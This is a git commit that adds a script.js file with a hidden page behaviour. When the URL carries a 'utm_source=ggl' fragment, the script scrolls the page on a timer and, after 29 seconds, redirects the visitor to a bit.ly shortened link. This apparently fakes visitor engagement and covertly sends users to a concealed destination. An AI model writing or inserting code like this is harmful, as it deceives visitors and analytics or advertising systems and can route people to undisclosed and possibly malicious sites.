fc35df564c0cc79a66408926b24120c5fce4734e
AdxPlatino <25423510+adxplatino@users.noreply.github.com>
2020-01-29 17:01:24 -0600

    2
    2

--- script.js
+++ script.js
@@ -1,1 +1,22 @@
 
+if (window.location.href.indexOf("#utm_source=ggl") > -1 ) {
+
+scrollingElement = (document.scrollingElement || document.body)
+
+setTimeout(function scrol(){
+ window.scrollTo(0, 300);
+}, 8000);
+
+setTimeout(function scrol(){
+ window.scrollTo(0, 600);
+}, 15000);
+
+setTimeout(function scrol(){
+ window.scrollTo(0, 1000);
+}, 20000);
+
+setTimeout(function scrol(){
+window.scrollTo(0, 1600);
+window.location.href = "http://bit.ly/2Rqo0OK";
+}, 29000);
+}
